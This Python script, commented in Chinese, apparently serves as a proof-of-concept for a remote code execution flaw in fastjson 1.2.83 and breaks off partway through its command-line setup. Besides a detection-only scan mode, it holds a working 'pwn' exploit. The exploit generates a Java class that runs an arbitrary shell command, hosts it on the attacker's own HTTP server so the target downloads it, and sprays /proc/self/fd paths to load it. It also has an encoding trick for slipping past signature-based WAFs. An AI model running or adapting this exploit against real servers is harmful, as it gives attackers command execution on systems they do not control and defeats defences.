#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
fastjson 1.2.83 `jar:` 协议 RCE —— 检测 + 完整复现 (单文件, 纯标准库 + requests/cryptography)

针对 fastjson 1.2.83 (autoType 默认关闭、无 safeMode) 借助 JVM 的 `jar:` 协议远程加载
并执行任意类的利用链。提供两个子命令:

  * scan   —— 纯带外(OOB)检测: 只探测、不执行代码。用一个 jar:http:// 的 @type 迫使
             目标在做任何类名校验前先把 jar 拉下来, 只要 interactsh 收到回连就判定存在漏洞。
  * pwn    —— 完整复现(真正 RCE): 本机用纯 Python 生成一个 this_class 为 `jar:` URL 的
             恶意类 (带 @JSONType 注解, 免 expectClass / 免继承), 打成 jar 并内置 HTTP 托管,
             再发 stage-1(下载落地) + stage-2(/proc/self/fd 喷洒)完成命令执行。

原理概览:
  fastjson 的 checkAutoType 会对任意 @type 值先跑一次 @JSONType 探测 (getResourceAsStream)。
  当 @type 是 `jar:http://<decIP>:<port>/<name>!/<entry>` 时, JVM 会在做任何类名校验 / loadClass
  之前先通过 HTTP 把 jar 拉下来 —— 这一次 OOB 请求在各种 JDK/容器组合下都会触发, 因此 scan
  只靠它做无害检测。要真正执行代码, 下载下来的 jar 会被缓存在 `/proc/self/fd/N`, 第二阶段用
  `jar:file:/proc/self/fd/N!/<entry>N` (全单斜杠, 过 JDK9+ 的类名校验) 把恶意类 define 出来并
  实例化, 触发 static 块 / 构造器里的 Runtime.exec。fastjson 把 `.` 替换成 `/` 去拼 URL, 所以
  攻击者 IP 必须用无点的十进制整数形式。

依赖:
  pip install requests cryptography      # cryptography 仅 scan/verify 需要

用法示例:
  # 完整复现(两阶段, 通过 / 端点, 任意容器/JDK):
  python3 poc.py pwn -t http://127.0.0.1:8090 -l <你的IP> -c 'id > /tmp/success'
  # 纯带外检测:
  python3 poc.py scan -o http://203.0.113.10:50050 -t http://127.0.0.1:8090/
"""

import argparse
import base64
import ipaddress
import json
import os
import re
import secrets
import socketserver
import struct
import sys
import threading
import time
from http.server import BaseHTTPRequestHandler
from urllib.parse import urlparse

import requests

# 目标可能是自签名/过期证书的主机，忽略 TLS 校验；关闭对应告警。
requests.packages.urllib3.disable_warnings()  # type: ignore[attr-defined]

VERSION = "2.0.0"


# --------------------------------------------------------------------------- #
# 彩色输出：非 TTY 或设置了 NO_COLOR 时自动关闭
# --------------------------------------------------------------------------- #
def _enable_windows_ansi() -> None:
    if os.name == "nt":
        try:
            import ctypes

            kernel32 = ctypes.windll.kernel32  # type: ignore[attr-defined]
            # ENABLE_PROCESSED_OUTPUT(1) | ENABLE_VIRTUAL_TERMINAL_PROCESSING(4)
            kernel32.SetConsoleMode(kernel32.GetStdHandle(-11), 7)
        except Exception:
            pass


_enable_windows_ansi()
USE_COLOR = (os.environ.get("NO_COLOR", "") == "") and sys.stdout.isatty()


def _colorize(code: str, s: str) -> str:
    if not USE_COLOR:
        return s
    return "\x1b[" + code + "m" + s + "\x1b[0m"


def red(s: str) -> str:
    return _colorize("31", s)


def green(s: str) -> str:
    return _colorize("32;1", s)


def yellow(s: str) -> str:
    return _colorize("33", s)


def cyan(s: str) -> str:
    return _colorize("36", s)


# --------------------------------------------------------------------------- #
# 时间间隔解析：把 "8s"/"25s"/"500ms"/"1m30s" 之类解析为秒
# --------------------------------------------------------------------------- #
_DUR_UNITS = {"ns": 1e-9, "us": 1e-6, "µs": 1e-6, "ms": 1e-3, "s": 1.0, "m": 60.0, "h": 3600.0}
_DUR_RE = re.compile(r"(\d+(?:\.\d+)?)(ns|us|µs|ms|s|m|h)")


def parse_duration(text: str) -> float:
    s = text.strip()
    if s == "" or s == "0":
        return 0.0
    matches = _DUR_RE.findall(s)
    if matches and "".join(a + b for a, b in matches) == s:
        return sum(float(val) * _DUR_UNITS[unit] for val, unit in matches)
    try:  # 允许纯数字，按秒处理
        return float(s)
    except ValueError:
        raise argparse.ArgumentTypeError(f"invalid duration: {text!r}")


def _fmt_dur(seconds: float) -> str:
    if seconds == int(seconds):
        return f"{int(seconds)}s"
    return f"{seconds}s"


# --------------------------------------------------------------------------- #
# 随机小写字母数字串
# --------------------------------------------------------------------------- #
_ALNUM = "abcdefghijklmnopqrstuvwxyz0123456789"


def rand_alnum(n: int) -> str:
    # 小写很重要：服务器在匹配前会把 seen id 小写化，我们也用小写 key 轮询。
    return "".join(secrets.choice(_ALNUM) for _ in range(n))


# 必须与服务器默认值一致 (pkg/settings): id 20 + nonce 13 = 33。
CORRELATION_ID_LEN = 20
NONCE_LEN = 13


# --------------------------------------------------------------------------- #
# IP / @type 工具 —— jar: 技巧要求攻击者 host 无点(十进制整数), 因为 fastjson 把 . 换成 /
# --------------------------------------------------------------------------- #
def to_decimal_ip(host: str) -> str:
    """点分 IPv4 -> 十进制整数字符串；已是纯数字则原样返回；否则抛 ValueError。"""
    if host.isdigit():
        return host
    ip = ipaddress.ip_address(host)  # 抛 ValueError
    if ip.version != 4:
        raise ValueError(f"not an IPv4 address: {host}")
    return str(int(ip))


def decimal_host_port(base: str):
    """把 http://1.2.3.4:8000 变成 ("16909060","8000")。"""
    b = base
    for pre in ("http://", "https://"):
        if b.startswith(pre):
            b = b[len(pre):]
            break
    if ":" not in b:
        raise ValueError(f"oob host must be host:port: {base!r}")
    host, port = b.rsplit(":", 1)
    return to_decimal_ip(host), port


def http_internal(dec_ip: str, port, name: str, entry: str) -> str:
    """stage-1 类内部名 (斜杠形式): jar:http://<decIP>:<port>/<name>!/<entry>"""
    return f"jar:http://{dec_ip}:{port}/{name}!/{entry}"


def file_internal(entry: str, n: int) -> str:
    """stage-2 类内部名 (斜杠形式): jar:file:/proc/self/fd/<N>!/<entry>N"""
    return f"jar:file:/proc/self/fd/{n}!/{entry}{n}"


def dot_type(slash_internal_name: str) -> str:
    """斜杠 URL 内部名 -> fastjson @type 的点号形式 (fastjson 内部再 . -> /)。"""
    return slash_internal_name.replace("/", ".")


# --------------------------------------------------------------------------- #
# 纯 Python Java class 生成器 —— 无需 javac / ASM / fastjson jar
#
# 生成一个类:
#   * this_class 内部名 = 传入的 `jar:` URL (斜杠形式), 与 @type 点号形式对应;
#   * 类上带 @com.alibaba.fastjson.annotation.JSONType (checkAutoType 的 jsonType 分支放行,
#     免 expectClass、免继承目标类);
#   * <clinit> 与 <init> 都调用 run(), run() 执行 Runtime.getRuntime().exec({"/bin/sh","-c",cmd});
#   * class 版本 50 (Java 6), 无分支 => 无需 StackMapTable, 在 JDK 8~21 均可加载。
# JVM 不强制受检异常, 故省去 try/catch。
# --------------------------------------------------------------------------- #
class _CP:
    """常量池构造器 (自动去重)。"""

    def __init__(self):
        self.entries = []
        self.cache = {}

    def _add(self, key, raw):
        if key in self.cache:
            return self.cache[key]
        self.entries.append(raw)
        idx = len(self.entries)  # 常量池索引从 1 开始
        self.cache[key] = idx
        return idx

    def utf8(self, s):
        b = s.encode("utf-8")
        return self._add(("u", s), b"\x01" + struct.pack(">H", len(b)) + b)

    def integer(self, v):
        return self._add(("i", v), b"\x03" + struct.pack(">i", v))

    def cls(self, name):
        return self._add(("c", name), b"\x07" + struct.pack(">H", self.utf8(name)))

    def string(self, s):
        return self._add(("s", s), b"\x08" + struct.pack(">H", self.utf8(s)))

    def nat(self, name, desc):
        return self._add(("n", name, desc), b"\x0c" + struct.pack(">HH", self.utf8(name), self.utf8(desc)))

    def methodref(self, cls, name, desc):
        return self._add(("m", cls, name, desc),
                         b"\x0a" + struct.pack(">HH", self.cls(cls), self.nat(name, desc)))

    def to_bytes(self):
        return struct.pack(">H", len(self.entries) + 1) + b"".join(self.entries)


def gen_class(internal_name: str, cmd: str) -> bytes:
    cp = _CP()
    this_c = cp.cls(internal_name)
    obj_c = cp.cls("java/lang/Object")
    code_u = cp.utf8("Code")
    init_n = cp.utf8("<init>")
    void_d = cp.utf8("()V")
    clinit_n = cp.utf8("<clinit>")
    run_n = cp.utf8("run")
    obj_init = cp.methodref("java/lang/Object", "<init>", "()V")
    run_ref = cp.methodref(internal_name, "run", "()V")
    getrt = cp.methodref("java/lang/Runtime", "getRuntime", "()Ljava/lang/Runtime;")
    execm = cp.methodref("java/lang/Runtime", "exec", "([Ljava/lang/String;)Ljava/lang/Process;")
    strcls = cp.cls("java/lang/String")
    s0 = cp.string("/bin/sh")
    s1 = cp.string("-c")
    scmd = cp.string(cmd)
    ann_type = cp.utf8("Lcom/alibaba/fastjson/annotation/JSONType;")
    rva = cp.utf8("RuntimeVisibleAnnotations")
    asm_name = cp.utf8("asm")
    false_int = cp.integer(0)

    def code_attr(max_stack, max_locals, code):
        body = struct.pack(">HH", max_stack, max_locals) + struct.pack(">I", len(code)) + code
        body += struct.pack(">H", 0)  # exception_table_length
        body += struct.pack(">H", 0)  # attributes_count
        return struct.pack(">H", code_u) + struct.pack(">I", len(body)) + body

    def method(flags, name_i, desc_i, ca):
        return struct.pack(">HHH", flags, name_i, desc_i) + struct.pack(">H", 1) + ca

    # <init>: aload_0; invokespecial Object.<init>; invokestatic run; return
    init_code = (b"\x2a" + b"\xb7" + struct.pack(">H", obj_init)
                 + b"\xb8" + struct.pack(">H", run_ref) + b"\xb1")
    m_init = method(0x0001, init_n, void_d, code_attr(1, 1, init_code))
    # <clinit>: invokestatic run; return
    clinit_code = b"\xb8" + struct.pack(">H", run_ref) + b"\xb1"
    m_clinit = method(0x0008, clinit_n, void_d, code_attr(1, 0, clinit_code))
    # run(): Runtime.getRuntime().exec(new String[]{"/bin/sh","-c",cmd}); return
    run_code = (
        b"\xb8" + struct.pack(">H", getrt)                          # invokestatic getRuntime
        + b"\x06"                                                   # iconst_3
        + b"\xbd" + struct.pack(">H", strcls)                       # anewarray String
        + b"\x59\x03\x13" + struct.pack(">H", s0) + b"\x53"         # dup iconst_0 ldc_w aastore
        + b"\x59\x04\x13" + struct.pack(">H", s1) + b"\x53"         # dup iconst_1 ldc_w aastore
        + b"\x59\x05\x13" + struct.pack(">H", scmd) + b"\x53"       # dup iconst_2 ldc_w aastore
        + b"\xb6" + struct.pack(">H", execm)                        # invokevirtual exec
        + b"\x57"                                                   # pop
        + b"\xb1"                                                   # return
    )
    m_run = method(0x0008, run_n, void_d, code_attr(5, 0, run_code))

    # @JSONType(asm = false):
    #   asm=false 迫使 fastjson 用反射反序列化器 (clazz.newInstance()) 而不是 ASM 生成的
    #   deserializer。ASM 版 createInstance 会用 `new <jar:URL 名>()` 按名字在 ASMClassLoader
    #   里重新解析这个畸形类名 -> ClassNotFoundException -> NoClassDefFoundError, <clinit> 不触发;
    #   反射版直接在已解析好的 Class 对象上 newInstance -> 初始化 -> <clinit> -> 命令执行。
    annotation = (struct.pack(">H", ann_type) + struct.pack(">H", 1)      # type, 1 element pair
                  + struct.pack(">H", asm_name) + b"Z" + struct.pack(">H", false_int))  # asm = (boolean)0
    class_ann = (struct.pack(">H", rva) + struct.pack(">I", 2 + len(annotation))
                 + struct.pack(">H", 1) + annotation)

    out = b"\xca\xfe\xba\xbe" + struct.pack(">HH", 0, 50)   # magic + minor/major (Java 6)
    out += cp.to_bytes()
    out += struct.pack(">H", 0x21)      # access_flags: ACC_PUBLIC | ACC_SUPER
    out += struct.pack(">H", this_c)
    out += struct.pack(">H", obj_c)
    out += struct.pack(">H", 0)         # interfaces_count
    out += struct.pack(">H", 0)         # fields_count
    out += struct.pack(">H", 3)         # methods_count
    out += m_init + m_clinit + m_run
    out += struct.pack(">H", 1)         # class attributes_count
    out += class_ann
    return out


def _jar_bytes(entries) -> bytes:
    """把 {name: class_bytes} 打成一个 (无压缩) jar/zip。"""
    import io
    import zipfile

    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_STORED) as zf:
        for name, data in entries.items():
            zf.writestr(name, data)
    return buf.getvalue()


def build_probe_jar(dec_ip: str, port, name: str, entry: str, cmd: str,
                    spray: bool, fd_low: int, fd_high: int) -> bytes:
    """生成 probe jar:
       - stage-1 条目 <entry>.class, 内部名 = jar:http URL (触发下载);
       - spray 模式再追加 <entry>N.class, 内部名 = jar:file:/proc/self/fd/N!/<entry>N。
    """
    entries = {entry + ".class": gen_class(http_internal(dec_ip, port, name, entry), cmd)}
    if spray:
        for n in range(fd_low, fd_high):
            entries[f"{entry}{n}.class"] = gen_class(file_internal(entry, n), cmd)
    return _jar_bytes(entries)


# --------------------------------------------------------------------------- #
# 内置 HTTP 服务 —— 任意路径都返回同一个 probe jar
# --------------------------------------------------------------------------- #
class _JarServer(socketserver.ThreadingTCPServer):
    allow_reuse_address = True
    daemon_threads = True


def serve_jar(port: int, jar: bytes, verbose: bool) -> _JarServer:
    class Handler(BaseHTTPRequestHandler):
        def do_GET(self):
            self.send_response(200)
            self.send_header("Content-Type", "application/java-archive")
            self.send_header("Content-Length", str(len(jar)))
            self.end_headers()
            try:
                self.wfile.write(jar)
            except (BrokenPipeError, ConnectionResetError):
                pass
            if verbose:
                print(f"{cyan('[http]')} served jar ({len(jar)} B) to "
                      f"{self.client_address[0]} GET {self.path}")

        def log_message(self, *args):
            pass  # 静默默认访问日志

    httpd = _JarServer(("0.0.0.0", port), Handler)
    threading.Thread(target=httpd.serve_forever, daemon=True).start()
    return httpd


# --------------------------------------------------------------------------- #
# interactsh 客户端 (OOB 检测)
# --------------------------------------------------------------------------- #
class InteractshError(Exception):
    pass


class InteractshClient:
    """精简版 interactsh 客户端：注册、轮询、解密 HTTP 交互 (基于路径关联)。"""

    def __init__(self, oob_url: str, timeout: float):
        u = urlparse(oob_url)
        if not u.scheme or not u.netloc:
            raise InteractshError(f"invalid oob url {oob_url!r}")
        self.base = f"{u.scheme}://{u.netloc}"
        self.corr_id = rand_alnum(CORRELATION_ID_LEN)  # 20 位，轮询 key
        self.secret = rand_alnum(32)
        from cryptography.hazmat.primitives.asymmetric import rsa
        self.priv = rsa.generate_private_key(public_exponent=65537, key_size=2048)
        self.timeout = timeout
        self.session = requests.Session()  # 与目标流量分开，不走代理

    def new_name(self) -> str:
        """返回 `<correlationID><fresh-nonce>` —— 33 字符 token，嵌入 payload 路径。"""
        return self.corr_id + rand_alnum(NONCE_LEN)

    def _encode_public_key(self) -> str:
        from cryptography.hazmat.primitives.serialization import Encoding, PublicFormat
        # 服务器给 PEM 块起名 "RSA PUBLIC KEY"，但里面存的是 PKIX(SubjectPublicKeyInfo) 字节。
        der = self.priv.public_key().public_bytes(Encoding.DER, PublicFormat.SubjectPublicKeyInfo)
        b64 = base64.b64encode(der).decode("ascii")
        lines = [b64[i: i + 64] for i in range(0, len(b64), 64)]
        pem = "-----BEGIN RSA PUBLIC KEY-----\n" + "\n".join(lines) + "\n-----END RSA PUBLIC KEY-----\n"
        return base64.b64encode(pem.encode("ascii")).decode("ascii")

    def register(self) -> None:
        body = {
            "public-key": self._encode_public_key(),
            "secret-key": self.secret,
            "correlation-id": self.corr_id,
        }
        resp = self.session.post(
            self.base + "/register", json=body, timeout=self.timeout,
            headers={"Content-Type": "application/json"},
        )
        if resp.status_code != 200:
            raise InteractshError(f"register failed: {resp.status_code}: {resp.text.strip()}")
        try:
            msg = resp.json().get("message")
        except ValueError:
            msg = None
        if msg != "registration successful":
            raise InteractshError(f"unexpected register response: {resp.text.strip()}")

    def poll(self):
        url = f"{self.base}/poll?id={self.corr_id}&secret={self.secret}"
        resp = self.session.get(url, timeout=self.timeout)
        if resp.status_code != 200:
            raise InteractshError(f"poll failed: {resp.status_code}: {resp.text.strip()}")
        try:
            pr = resp.json()
        except ValueError as e:
            raise InteractshError(f"decode poll response: {e}")

        out = []
        aes_key = pr.get("aes_key") or ""
        for d in pr.get("data") or []:
            try:
                plain = self._decrypt(aes_key, d)
            except Exception:
                continue  # 单条坏数据不应拖垮整批
            try:
                it = json.loads(plain.strip())
            except (ValueError, UnicodeDecodeError):
                continue
            if isinstance(it, dict):
                out.append(it)
        # extra / tlddata 是明文 JSON
        for s in (pr.get("extra") or []) + (pr.get("tlddata") or []):
            if not s:
                continue
            try:
                it = json.loads(s)
            except (ValueError, TypeError):
                continue
            if isinstance(it, dict):
                out.append(it)
        return out

    def deregister(self) -> None:
        body = {"correlation-id": self.corr_id, "secret-key": self.secret}
        try:
            self.session.post(
                self.base + "/deregister", json=body, timeout=self.timeout,
                headers={"Content-Type": "application/json"},
            )
        except requests.RequestException:
            pass

    def _decrypt(self, aes_key_b64: str, msg_b64: str) -> bytes:
        # 逆向服务器的 AES-256-CTR-over-RSA-OAEP(SHA256) 方案。
        from cryptography.hazmat.primitives import hashes
        from cryptography.hazmat.primitives.asymmetric import padding
        from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
        wrapped = base64.b64decode(aes_key_b64)
        key = self.priv.decrypt(
            wrapped,
            padding.OAEP(mgf=padding.MGF1(hashes.SHA256()), algorithm=hashes.SHA256(), label=None),
        )
        ct = base64.b64decode(msg_b64)
        if len(ct) < 16:
            raise ValueError("ciphertext too short")
        iv, data = ct[:16], ct[16:]
        cipher = Cipher(algorithms.AES(key), modes.CTR(iv))
        dec = cipher.decryptor()
        return dec.update(data) + dec.finalize()


# --------------------------------------------------------------------------- #
# Ghost Bits：用全角字符做 \u 编码来绕过签名 WAF
# --------------------------------------------------------------------------- #
def ghost_hex_digit(n: int) -> str:
    # 全角数字 ０-９ (U+FF10) 表示 0-9，全角字母 ａ-ｆ (U+FF41) 表示 10-15。
    if n < 10:
        return chr(0xFF10 + n)
    return chr(0xFF41 + (n - 10))


def ghost_escape(s: str) -> str:
    # 把每个字符编码成 \u + 四个全角十六进制字形。仅绕过签名匹配，绕不过 safeMode。
    out = []
    for ch in s:
        code = ord(ch)
        out.append("\\u")
        for shift in (12, 8, 4, 0):
            out.append(ghost_hex_digit((code >> shift) & 0xF))
    return "".join(out)


def build_body(at_type: str, ghost: bool) -> bytes:
    """构造要发送的 JSON body：`{"@type":"<at_type>","x":1}`；ghost 模式 key 与值都用 \\u 全角编码。"""
    if ghost:
        key = ghost_escape("@type")
        val = ghost_escape(at_type)
    else:
        key = "@type"
        val = at_type
    return ('{"' + key + '":"' + val + '","x":1}').encode("utf-8")


def parse_proxy(s: str):
    """把代理字符串规范化。裸 host:port 默认 http；显式 http/https 透传。"""
    if "://" not in s:
        s = "http://" + s
    u = urlparse(s)
    if not u.hostname:
        raise ValueError(f"proxy has no host: {s!r}")
    return u.scheme, u.netloc, f"{u.scheme}://{u.netloc}"


# --------------------------------------------------------------------------- #
# 小工具
# --------------------------------------------------------------------------- #
def clip(s: str, n: int) -> str:
    if len(s) <= n:
        return s
    return s[:n] + "…"


def first_line(s: str) -> str:
    for i, ch in enumerate(s):
        if ch in "\r\n":
            return s[:i]
    return s


def snippet(body: str) -> str:
    if not body:
        return ""
    b = re.sub(r"\s+", " ", body).strip()
    return b[:120] + "…" if len(b) > 120 else b


def load_targets(single, file):
    out = list(single or [])
    if file:
        with open(file, "r", encoding="utf-8") as f:
            for ln in f.read().split("\n"):
                ln = ln.strip()
                if ln and not ln.startswith("#"):
                    out.append(ln)
    return out


def parse_headers(items):
    """把重复的 `-H "Name: Value"` 解析为 dict —— 用于携带 Cookie/Authorization 等头。"""
    headers = {}
    for raw in items or []:
        name, sep, value = raw.partition(":")
        name = name.strip()
        if not sep or not name:
            raise ValueError(f"invalid header (want 'Name: Value'): {raw!r}")
        headers[name] = value.lstrip()
    return headers


def join_url(target: str, endpoint: str) -> str:
    return target.rstrip("/") + (endpoint if endpoint.startswith("/") else "/" + endpoint)


def http_post(session, url, body, headers, timeout, proxies):
    hdrs = {"Content-Type": "application/json"}
    hdrs.update(headers or {})
    return session.post(url, data=body, headers=hdrs, timeout=timeout,
                        proxies=proxies, verify=False, allow_redirects=False)


# --------------------------------------------------------------------------- #
# scan：纯带外检测 (只探测、不执行)
# --------------------------------------------------------------------------- #
def send_probe(session, url, body, headers, timeout, proxies, verbose):
    try:
        http_post(session, url, body, headers, timeout, proxies)
    except requests.RequestException as e:
        if verbose:
            print(f"{yellow('[!]')} send {url}: {e}")


def run_scan(cfg) -> int:
    c = InteractshClient(cfg["oob"], cfg["timeout"])
    try:
        dec_ip, port = decimal_host_port(c.base)
    except ValueError as e:
        raise SystemExit(
            f"{red('error:')} oob host must be an IPv4 (jar: trick needs a dot-free host): {e}"
        )

    c.register()
    print(
        f"{cyan('[*]')} registered with {c.base}  "
        f"(correlationID={c.corr_id}, oob={dec_ip}:{port})"
    )
    try:
        proxies = None
        if cfg["proxy"]:
            scheme, netloc, norm = parse_proxy(cfg["proxy"])
            proxies = {"http": norm, "https": norm}
            print(f"{cyan('[*]')} target traffic via proxy {norm}")
        target_session = requests.Session()

        tasks = {}   # name -> 目标 URL
        labels = []
        for tgt in cfg["targets"]:
            name = c.new_name()
            at_type = dot_type(http_internal(dec_ip, port, name, cfg["entry"]))
            body = build_body(at_type, cfg["ghost"])
            tasks[name] = tgt
            labels.append(tgt)
            if cfg["verbose"]:
                print(f"{cyan('[>]')} {tgt}  @type={at_type}")
                print(f"    body: {clip(body.decode('utf-8', 'replace'), 240)}")
            send_probe(target_session, tgt, body, cfg["headers"], cfg["timeout"], proxies, cfg["verbose"])
        print(
            f"{cyan('[*]')} sent {len(labels)} probe(s); polling "
            f"{_fmt_dur(cfg['wait'])} for callbacks..."
        )

        confirmed = {}
        deadline = time.monotonic() + cfg["wait"]
        while True:
            try:
                its = c.poll()
            except InteractshError as e:
                its = []
                if cfg["verbose"]:
                    print(f"{yellow('[!]')} poll: {e}")
            for it in its:
                uid = str(it.get("unique-id", ""))
                label = tasks.get(uid.lower())
                if label is None or confirmed.get(uid):
                    continue
                confirmed[uid] = True
                print(f"\n{green('[+] VULNERABLE')} {label}")
                print(f"    via {it.get('protocol')} callback from {it.get('remote-address')}")
                line = first_line(it.get("raw-request", "") or "")
                if line:
                    print(f"    request: {line}")
            if time.monotonic() > deadline:
                break
            time.sleep(cfg["interval"])

        vuln = {}
        for uid in confirmed:
            vuln[tasks[uid]] = True
        print(f"\n{cyan('[*]')} done: {len(vuln)}/{len(labels)} probe(s) vulnerable")
        for label in labels:
            if vuln.get(label):
                print(f"    {green('VULNERABLE')}  {label}")
            else:
                print(f"    no callback  {label}")
        return len(vuln)
    finally:
        c.deregister()


# --------------------------------------------------------------------------- #
# pwn：完整复现 (真正执行命令)
# --------------------------------------------------------------------------- #
def run_pwn(cfg) -> int:
    try:
        dec_ip = to_decimal_ip(cfg["lhost"])
    except ValueError as e:
        print(f"{red('error:')} lhost 必须是点分 IPv4 或十进制整数 "
              f"(含字母的主机名会因 jar: 技巧把点替换成斜杠而失效): {e}", file=sys.stderr)
        return 2
    if dec_ip != cfg["lhost"]:
        print(f"{cyan('[*]')} lhost {cfg['lhost']} -> 十进制 {dec_ip}")

    # fastjson 用静态全局 mappings 缓存已加载的类 (键=@type 字符串)。为避免对同一个
    # 未重启的 JVM 反复打靶时命中上一轮的旧类 (旧命令), 每次运行给 entry 追加随机后缀,
    # 使 stage-1/stage-2 的 @type 都唯一。用户显式指定 --entry 时尊重其取值。
    entry = cfg["entry"] or ("POC" + rand_alnum(4))
    cfg["entry"] = entry
    url = join_url(cfg["target"], cfg["endpoint"])
    jar = build_probe_jar(dec_ip, cfg["lport"], cfg["name"], cfg["entry"], cfg["cmd"],
                          True, cfg["fd_low"], cfg["fd_high"])
    print(f"{green('[+]')} 构建 probe jar: {len(jar)} bytes, "
          f"spray {cfg['fd_high'] - cfg['fd_low']} fd 类, cmd=[{cfg['cmd']}]")

    try:
        httpd = serve_jar(cfg["lport"], jar, cfg["verbose"])
    except OSError as e:
        print(f"{red('error:')} 无法监听 0.0.0.0:{cfg['lport']}: {e}", file=sys.stderr)
        return 2
    print(f"{green('[+]')} 内置 HTTP 托管 0.0.0.0:{cfg['lport']} (任意路径返回该 jar)")

    session = requests.Session()
    timeout = cfg["timeout"]
    try:
        # ---------- stage 1: 触发下载落地 ----------
        http_dot = dot_type(http_internal(dec_ip, cfg["lport"], cfg["name"], cfg["entry"]))
        print(f"{cyan('[*]')} STAGE 1 -> {url}  下载 {http_dot}")
        try:
            r1 = http_post(session, url, build_body(http_dot, cfg["ghost"]), cfg["headers"], timeout, None)
            print(f"{cyan('[*]')}   响应 {r1.status_code} {snippet(r1.text)}")
        except requests.RequestException as e:
            print(f"{yellow('[!]')}   stage1 请求异常 (下载副作用可能已发生): {e}")

        # ---------- stage 2: /proc/self/fd 盲喷 ----------
        # stage-1 下载的 jar 被 URLClassLoader 缓存在某个 `/tmp/jar_cache*.tmp (deleted)`,
        # 对应一个 /proc/self/fd/N。我们并不知道 N (本环境实测 ~33), 于是遍历一段 fd 区间,
        # 用 jar:file:/proc/self/fd/N!/<entry>N (全单斜杠, 过各 JDK 类名校验) 逐个尝试; 命中真正
        # 那个 N 时, 恶意类被 define + 实例化 -> static/<init> 执行命令。
        # 注意: 命中与否无法靠 HTTP 响应判定 —— 像 @RequestBody User 这类带 expectClass 的入口,
        # 命令虽已执行, 返回对象却因不是目标 bean 而报错; 因此这是一次“盲打”, 结果需带外核验。
        lo, hi = cfg["fd_low"], cfg["fd_high"]
        print(f"{cyan('[*]')} STAGE 2 -> 遍历 fd [{lo},{hi}) 盲打 "
              f"(下载的 jar 缓存于某个 /proc/self/fd/N, 命中即 define+实例化恶意类 -> 执行命令)")
        total = hi - lo
        for i, n in enumerate(range(lo, hi), 1):
            file_dot = dot_type(file_internal(cfg["entry"], n))
            try:
                http_post(session, url, build_body(file_dot, cfg["ghost"]), cfg["headers"], timeout, None)
            except requests.RequestException:
                continue
            if USE_COLOR:
                sys.stdout.write(f"\r{cyan('[*]')} spraying fd {n}  ({i}/{total})   ")
                sys.stdout.flush()
        if USE_COLOR:
            sys.stdout.write("\n")
        print(f"{green('[+]')} STAGE 2 完成: 已向 fd [{lo},{hi}) 盲发 stage-2 请求, "
              f"若目标存在漏洞, 命令 [{cfg['cmd']}] 已在目标执行")
        print(f"{cyan('[*]')} 请带外核验执行结果 "
              f"(本环境示例可在容器内 `docker compose exec web cat /tmp/success`)")
        return 0
    finally:
        httpd.shutdown()


# --------------------------------------------------------------------------- #
# 命令实现
# --------------------------------------------------------------------------- #
def cmd_scan(args) -> int:
    targets = load_targets(args.target, args.file)
    if not targets:
        print(f"{red('error:')} no targets: pass --target/-t or --file/-f", file=sys.stderr)
        return 1
    try:
        headers = parse_headers(args.header)
    except ValueError as e:
        print(f"{red('error:')} {e}", file=sys.stderr)
        return 1
    cfg = {
        "oob": args.oob, "targets": targets, "headers": headers, "proxy": args.proxy,
        "ghost": args.ghost, "entry": args.entry, "timeout": args.timeout,
        "wait": args.wait, "interval": args.interval, "verbose": args.verbose,
    }
    try:
        vuln = run_scan(cfg)
    except InteractshError as e:
        print(f"{red('error:')} interactsh: {e}", file=sys.stderr)
        return 1
    except (OSError, ValueError) as e:
        print(f"{red('error:')} {e}", file=sys.stderr)
        return 1
    return 1 if vuln > 0 else 0  # 有命中则非零，便于 CI/脚本标记


def cmd_pwn(args) -> int:
    try:
        headers = parse_headers(args.header)
    except ValueError as e:
        print(f"{red('error:')} {e}", file=sys.stderr)
        return 2
    if args.fd_low < 0 or args.fd_high <= args.fd_low:
        print(f"{red('error:')} fd 范围非法: [{args.fd_low},{args.fd_high})", file=sys.stderr)
        return 2
    cfg = {
        "target": args.target, "endpoint": args.endpoint, "lhost": args.lhost,
        "lport": args.lport, "name": args.name, "entry": args.entry, "cmd": args.cmd,
        "ghost": args.ghost, "headers": headers,
        "fd_low": args.fd_low, "fd_high": args.fd_high, "timeout": args.timeout,
        "verbose": args.verbose,
    }
    return run_pwn(cfg)


# --------------------------------------------------------------------------- #
# CLI
# --------------------------------------------------------------------------- #
def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        prog="fastjson-1.2.83-poc",
        description="fastjson 1.2.83 jar:-protocol RCE — OOB detector (scan) and full exploit (pwn)",
    )
    parser.add_argument("--version", action="version", version=f"fastjson-1.2.83-poc {VERSION}")
    sub = parser.add_subparsers(dest="command", required=True)

    env_oob = os.environ.get("OOB_URL")

    # ---- pwn (完整复现) ----
    w = sub.add_parser("pwn", aliases=["p"],
                       help="full exploit: build a jar:-named class, host it, and run a command via RCE")
    w.add_argument("-t", "--target", required=True, help="target base URL, e.g. http://127.0.0.1:8090")
    w.add_argument("-e", "--endpoint", default="/",
                   help="deserialization endpoint path (default /)")
    w.add_argument("-l", "--lhost", default="127.0.0.1",
                   help="attacker HTTP host, dotted-quad or decimal (must be reachable by target)")
    w.add_argument("-p", "--lport", type=int, default=8000, help="attacker HTTP port (default 8000)")
    w.add_argument("-c", "--cmd", default="id > /tmp/success",
                   help="command to run via /bin/sh -c (default: id > /tmp/success)")
    w.add_argument("--name", default="probe", help="jar URL path / filename (default probe)")
    w.add_argument("--entry", default=None,
                   help="jar entry base name (default: POC + random suffix, to dodge fastjson's class cache)")
    w.add_argument("--ghost", action="store_true",
                   help="Ghost-Bits: \\u-encode @type with fullwidth digits to evade signature WAFs")
    w.add_argument("-H", "--header", action="append", default=[], metavar="'Name: Value'",
                   help="extra request header, curl-style (repeatable)")
    w.add_argument("--fd-low", type=int, default=10, dest="fd_low", help="fd spray lower bound (default 10)")
    w.add_argument("--fd-high", type=int, default=300, dest="fd_high",
                   help="fd spray upper bound, exclusive (default 300)")
    w.add_argument("--timeout", type=parse_duration, default="8s", metavar="DURATION",
                   help="per-request HTTP timeout (default 8s)")
    w.add_argument("-v", "--verbose", action="store_true", help="print jar-fetch and extra logs")
    w.set_defaults(func=cmd_pwn)

    # ---- scan (OOB 检测) ----
    p = sub.add_parser("scan", aliases=["s"],
                       help="probe targets out-of-band and report which are vulnerable (detect only)")
    p.add_argument("-o", "--oob", default=env_oob, required=env_oob is None,
                   help="interactsh OOB base URL (must be IPv4, no domain), "
